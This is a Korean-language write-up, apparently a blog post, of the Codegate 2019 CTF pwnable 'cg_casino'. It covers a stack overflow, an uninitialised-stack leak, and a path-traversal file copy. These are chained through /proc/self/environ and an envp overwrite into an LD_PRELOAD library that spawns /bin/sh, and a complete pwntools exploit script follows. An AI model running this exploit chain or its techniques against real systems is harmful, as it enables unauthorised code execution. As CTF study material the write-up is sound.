+++
title = "Codegate 2019 CTF Quals - cg_casino"
date = "2024-08-01"
description = "Codegate 2019 CTF Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "bof", "/proc/self/environ", "ld_preload", "envp"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/cg_casino'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
### Concept
``` bash
➜  nc 0 6677
$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$  CG CASINO $$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$
1) put voucher
2) merge voucher
3) lotto
4) up down game
5) slot machine
6) exit
> 
```
세 개의 카지노 게임과 `put voucher`와 `merge voucher` 기능이 구현되어있다.

## 0x01. Vulnerability
### Stack overflow
``` c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  char new[48]; // [rsp+30h] [rbp-60h] BYREF
  char old[40]; // [rsp+60h] [rbp-30h] BYREF
  ...
    switch ( choice )
    {
      case 1:
        memset(new, 0, 0x28uLL);
        printf("input voucher : ");
        read_401108((__int64)new);
        len32_alnum_4010A4(new);
        break;
      case 2:
        memset(old, 0, sizeof(old));
        printf("input old voucher : ");
        read_401108((__int64)old);
        xstat_unlink_400F09(new, old);
        break;
```
먼저 `voucher`를 `put`하거나 `merge`하기 위해 `voucher` 이름을 입력받는데, `read_401108()`에서 입력을 받게 된다.
``` c
unsigned __int64 __fastcall read_401108(__int64 a1)
{
  ...
  while ( 1 )
  {
    if ( (unsigned int)read(0, &buf, 1uLL) != 1 )
      exit(-1);
    if ( buf == 10 )
      break;
    index = i++;
    *(_BYTE *)(a1 + index) = buf;
  }
  v1 = i++;
  *(_BYTE *)(v1 + a1) = 0;
  ...
}
```
그런데 입력을 `\n`이 나올 때까지 1바이트씩 끝없이 받기 때문에 stack의 끝까지 overflow가 발생한다.

하지만 `main()`에서 return을 하는 부분 없이 바로 `exit()`을 하기 때문에 rip control은 어려워 보인다.

### Stack leak
동적 분석을 하다가 우연히 얻어걸렸는데, `lotto_4011A7()`에서 초기화되지 않은 데이터의 leak이 가능하다.
``` c
unsigned __int64 lotto_4011A7()
{
  ...
  int number[6]; // [rsp+10h] [rbp-40h]
  int guess[6]; // [rsp+30h] [rbp-20h] BYREF
  ...
  while ( i <= 5 )
  {
    __isoc99_scanf("%u", &guess[i]);
    getchar();
    if ( (unsigned int)guess[i] <= 44 )
      ++i;
    else
      printf("%u : out of range\n", (unsigned int)guess[i]);
  }
  puts("===================");
  ...
}
```
원래는 단순히 0~44 범위의 랜덤 숫자 6개를 생성해서 저장한 후, `guess` 배열에 값을 입력해서 맞추는 게임이다.

그런데 `guess` 값으로 `%u` 형식에 맞지 않는, 가령 `a`가 입력되면 `scanf`가 실패하고 기존에 저장되어있던 `guess`의 값을 출력해준다.
``` bash
GUESS 6 Numbers!
===================
|  |  |  |  |  |  |
===================
a a a a a a
2522534248 : out of range
2522534248 : out of range
2522534248 : out of range
2522534248 : out of range
```

### File copy
사실 취약점이라기보다는 바이너리에 주어진 기능인데, `merge voucher`에서 다음 함수가 호출된다.
``` c
unsigned __int64 __fastcall xstat_unlink_400F09(const char *new, char *old)
{
  ...
  if ( strlen(old) == 32 )
  {
    if ( xstat_4016D0(old, &n_4) == -1 )
    {
      puts("voucher doesn't exist");
    }
    else if ( n_4.st_size <= 4096 )
    {
      fd_old = open(old, 0);
      if ( fd_old != -1 )
      {
        len = read(fd_old, buf, 4096uLL);
        close(fd_old);
        fd_new = open(new, 66, 384LL);
        if ( fd_new != -1 )
        {
          write(fd_new, buf, len);
          close(fd_new);
          unlink(old);
        }
        memset(buf, 0, 0x1000uLL);
      }
    }
    ...
}
```
`put voucher`를 통해서 stack의 `new`에 파일명을 지정해두면, 파일명이 32바이트인 파일을 `/home/cg_casino/voucher/` 디렉토리로 옮길 수 있다.

입력한 내용에 대한 검증이 따로 없으므로 길이 제한은 `../`, `./`를 잘 조합해서 우회할 수 있다.
- ../../../../../../././etc/passwd

## 0x02. Exploit
### File drop
취약점은 이게 끝인데, 문제는 파일을 서버에 올릴 방법이 없다.

어떻게든 파일을 서버에 올린 다음 `merge voucher` 기능을 이용해서 파일을 `/home/cg_casino/voucher/` 경로로 옮긴 후 다음 단계로 넘어가야할 것 같은데...

그러다가 `/proc/self/environ` 파일에서 다음 내용을 발견했다.
``` bash
cg_casino@3197b44a521a:~/voucher$ cat /proc/1203/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=3197b44a52
1aERASER2=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
```
`AAAA`는 `docker-compose.yml` 파일에서 정의된 환경변수 값들인데, 앞부분은 다른 내용으로 바뀐 것을 보니 실행 중 값을 반영하는 것 같았다.

실제로 stack의 끝에 있는 환경변수까지 값을 덮어보니 다음과 같이 `/proc/self/environ` 파일이 변경된 것을 확인할 수 있었다.
``` bash
cg_casino@3197b44a521a:~/voucher$ cat /proc/1241/environ
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
...
```
따라서 이런 식으로 stack의 값을 조작해서 `/proc/self/environ`에 파일의 형태로 남길 수 있다.

### Stack overflow & File copy
`/proc/self/environ`에 libc 데이터를 쓰고 그것을 `/home/cg_casino/voucher`로 가져오기 위한 조건은 총 3개이다.
- main의 new가 `/home/cg_casino/voucher`에 저장할 파일명일 것
- main의 old가 길이가 32이고 `/proc/self/environ` 파일을 가리킬 것
- stack 끝의 환경변수가 저장된 공간에 libc 데이터가 쓰여질 것

따라서 다음과 같이 payload를 구성했다.
``` python
    payload = b"mylib.so\x00"
    payload += b"\x00" * (env - buf - len(payload))
    payload += lib_data
    payload += b"\x00" * (3432 - (len(payload)))
    put_voucher(s, payload)

    merge_voucher(s, b"../../../../../proc/self/environ")
```
한편 이 과정에서 `read_401108()`를 이용해서 입력을 받기 때문에 libc에 `\x0a`가 있으면 데이터가 짤릴 위험이 있다.

실제로도 `\x0a`가 있어서 혹시나 하는 마음에 `\x0b`로 바꿔봤는데 다행히 libc가 잘 작동했다.
``` python
    with open("./mylib.so", "rb") as f:
        lib_data = f.read()
    lib_data = lib_data.replace(b"\x0a", b"\x0b")
```
따라서 위 payload를 추가해주어야 한다.

### Small libc
여기에서 문제가 하나 더 있는데 환경변수 영역도 한도가 있기 때문에 `merge voucher`로 가져올 수 있는 데이터 길이가 제한되어있다.
``` bash
root@3197b44a521a:/home/cg_casino/voucher# ls -al
total 16
drwxrwx-wx 1 root      root      4096 Aug  1 05:24 .
drwxr-xr-x 1 root      root      4096 Jul 31 08:08 ..
-rw------- 1 cg_casino cg_casino 3432 Aug  1 05:23 mylib.so
```
그래서 3432보다 작은 libc가 필요한데, 다음 소스코드를 `Ubunut 16.04`에서 컴파일해서 사이즈가 작은 libc를 만들 수 있었다.
``` c
// gcc -w -znorelro -s -fPIC -shared -nostdlib -o mylib.so mylib.c
__attribute__((destructor))
void on_unload() {
	system("/bin/sh");
}
```
`Ubuntu 22.04`에서는 같은 컴파일 옵션을 줘도 사이즈가 꽤 큰데, 컴파일러 버전에 따라서도 이렇게 차이가 심할 수 있다니 알아둬야겠다.
``` bash
➜  ls -al | grep mylib_from
-rwxr-xr-x 1 user user    2632 Aug  1 08:28 mylib_from1604.so
-rwxr-xr-x 1 user user   10160 Aug  1 14:40 mylib_from2204.so
```

### Stack leak
앞서 확인한대로 `lotto_4011A7()`에서 `%u` 형식이 아닌 데이터를 입력하면 `guess[i]`의 데이터를 출력할 수 있다.

`guess`는 6개의 integer 배열이므로 총 `0x18` 길이의 메모리를 확인할 수 있고 초기화되지 않은 상태에서의 `guess` 값을 확인해보면,
``` bash
gef➤  x/3gx $rsp+0x30
0x7fffffffdef0: 0x0000000000000000      0x00007ffff7ffe168
0x7fffffffdf00: 0x0000000000000000
```
libc 영역의 주소가 남아있는데 필요한 주소값이 뭔지 생각해보면 stack의 주소에 가깝다.

따라서 다른 함수를 먼저 실행해서 `$rsp+0x30` 영역에 stack 주소를 남길 수 있는지 확인해보았는데, `up_down_40139E()`을 호출한 뒤 `lotto_4011A7()`를 호출하면 가능하다.
``` bash
gef➤  x/3gx $rsp+0x30
0x7fffffffdef0: 0x0000000000000000      0x00007fffffffdf10
0x7fffffffdf00: 0x0000000000400bb0
```
`guess`는 integer이므로 3번째, 4번째 입력을 줄 때 'a'를 입력하면 4바이트씩 leak이 가능하므로, 다음과 같이 payload를 작성했다.
``` python
    updown(s, [1, 1, 1, 1, 1, 1])
    r = lotto(s, b"1 2 a 3 a 4 5 6")
    lower = int(r.split(b" : ")[0])
    upper = int(r.split(b" : ")[1].split(b"\n")[1])
    buf = upper << 32 | lower + 0x40
    log.info(f"buf : {hex(buf)}")
```

### Envp overwrite
이제 쉘을 실행해주는 libc 파일을 `/home/cg_casino/voucher`에 안착시켰으니, 이걸 실행만 시키면 된다.

일반적으로 원하는 libc를 로드하는 테크닉으로 `LD_PRELOAD` 환경변수를 이용하는 방식이 있어서 어떻게 활용할지 고민했다.

현재 libc에 `on_unload()`를 정의해놓았으므로 두 가지를 확인해야하는데,
1. `exit(0);`을 통해서도 `on_unload()`가 호출되는지
2. 환경변수를 실행 이후에 변경해도 `LD_PRELOAD`가 적용되는지

테스트 코드를 작성해서 1번은 가능한 것을 확인했는데 아쉽게도 2번이 적용되지 않았다.

따라서 현재 프로세스의 환경변수를 조작해놓고, 그 환경변수를 가져다가 쓰는 프로세스를 실행할 수 있어야 한다.

그러다가 `slot_401477()`에서 `system("/usr/bin/clear");`을 사용하는데, 동적 분석을 할 때 다음과 같은 메세지가 출력된 것이 기억났다.
``` bash
        _______
       |JACKPOT|
=========================
|   ___    ___    ___    |
|  | ? |  | ? |  | ? |   |
|  |___|  |___|  |___|   |
=========================
|________________________|
press any key

TERM environment variable not set
```
현재 프로세스인 `cg_casino`는 환경변수가 `docker-compose.yml` 파일에서 `ERASER`를 통해 값이 밀려있는 상태이다.

여기에서 `system()`을 사용할 때 내부적으로 `execve()`가 호출되는데 이 과정에서 `**envp`가 전달되는 것 같다.

`**envp`는 `main()`이 호출될 때 3번째 인자로 전달되고, `main()`의 초반에서 다음과 같이 `$rbp-0x88`에 저장이 된다.
```
   0x400ca6:    push   rbp
   0x400ca7:    mov    rbp,rsp
   0x400caa:    sub    rsp,0x90
   0x400cb1:    mov    DWORD PTR [rbp-0x74],edi
   0x400cb4:    mov    QWORD PTR [rbp-0x80],rsi
   0x400cb8:    mov    QWORD PTR [rbp-0x88],rdx
```
이 상태에서 메모리를 따라가보면,
``` bash
gef➤  x/gx $rbp-0x88
0x7fffffffdf28: 0x00007fffffffe0a8
gef➤  x/10gx 0x00007fffffffe0a8
0x7fffffffe0a8: 0x00007fffffffe276      0x00007fffffffe2b8
0x7fffffffe0b8: 0x00007fffffffe2ce      0x00007fffffffe564
0x7fffffffe0c8: 0x00007fffffffe7fa      0x00007fffffffea90
0x7fffffffe0d8: 0x00007fffffffed26      0x00007fffffffefbc
0x7fffffffe0e8: 0x00007fffffffefc7      0x0000000000000000
gef➤  x/s 0x00007fffffffe276
0x7fffffffe276: "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```
`**envp(0x7fffffffdf28)` -> `*envp(0x7fffffffe0a8)` -> `first envp(0x7fffffffe276)` 형식으로 구성되어있다.

따라서 이 구성을 잘 따르되, `*envp`의 끝에는 `null`을 꼭 넣어주어야 한다.
``` python
    payload = b"\x00" * (env_p_p - buf)
    payload += p64(env_p)
    payload += b"\x00" * (env_p - buf - len(payload))
    payload += p64(env)
    payload += b"\x00" * (env - buf - len(payload))
    payload += b"LD_PRELOAD=/home/cg_casino/voucher/mylib.so\x00"
    put_voucher(s, payload)

    s.sendline(b"5")
```
문제는 여기서 환경변수가 stack의 끝자락에 위치하게 되는데, 이 offset이 일정하지 않아서 확률 이슈가 발생한다.

차이를 계속 체크해보니 `0xXX0` 정도 차이가 나는 것으로 보아 1/256 확률로 exploit이 성공할 것 같다.
## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
import sys, os

DEBUG = False
BINARY = "cg_casino"
CONTAINER = "d20ec1bc9a88"

bp = {
    "getchar_of_main" : 0x400CF8,
    "read_bof" : 0x401108,
    "xstat_unlink" : 0x400F09,
    "slotmachine" : 0x401477,
    "lotto" : 0x4011A7,
    "scanf_of_lotto" : 0x40129D,
}

gs = f'''
set follow-fork-mode child
!b *{bp["xstat_unlink"]}
b *{bp["getchar_of_main"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def put_voucher(s, new):
    s.sendline(b"1")
    s.recvuntil(b" : ")
    s.sendline(new)
    sleep(0.1)
    return s.recvuntil(b"> ")

def merge_voucher(s, old):
    s.sendline(b"2")
    s.recvuntil(b" : ")
    s.sendline(old)
    return s.recvuntil(b"> ")

def lotto(s, numbers):
    s.sendline(b"3")
    sleep(0.1)
    s.recv()
    s.sendline(numbers)
    return s.recvuntil(b"> ")

def updown(s, numbers):
    s.sendline(b"4")
    s.recvuntil(b". \n")
    for number in numbers:
        s.sendline(str(number).encode())
        s.recvuntil(b"it\n")
    return s.recvuntil(b"> ")

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(f"/home/user/{BINARY}")
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    
    with open("./mylib.so", "rb") as f:
        lib_data = f.read()
    lib_data = lib_data.replace(b"\x0a", b"\x0b")

    s.recvuntil(b"> ")

    updown(s, [1, 1, 1, 1, 1, 1])
    r = lotto(s, b"1 2 a 3 a 4 5 6")
    lower = int(r.split(b" : ")[0])
    upper = int(r.split(b" : ")[1].split(b"\n")[1])
    buf = upper << 32 | lower + 0x40
    log.info(f"buf : {hex(buf)}")

    env = buf + 0x1796
    env = buf + 0x326
    env_p = buf + 0x158
    env_p_p = buf + 0xe8
    log.info(f"env_p_p : {hex(env_p_p)}")
    log.info(f"env_p : {hex(env_p)}")
    log.info(f"env : {hex(env)}")

    payload = b"mylib.so\x00"
    payload += b"\x00" * (env - buf - len(payload))
    payload += lib_data
    payload += b"\x00" * (3432 - (len(payload)))
    put_voucher(s, payload)
    
    pause()

    merge_voucher(s, b"../../../../../proc/self/environ")

    payload = b"\x00" * (env_p_p - buf)
    payload += p64(env_p)
    payload += b"\x00" * (env_p - buf - len(payload))
    payload += p64(env)
    payload += b"\x00" * (env - buf - len(payload))
    payload += b"LD_PRELOAD=/home/cg_casino/voucher/mylib.so\x00"
    put_voucher(s, payload)

    s.sendline(b"5")

    s.interactive()

if __name__=='__main__':
    main()
```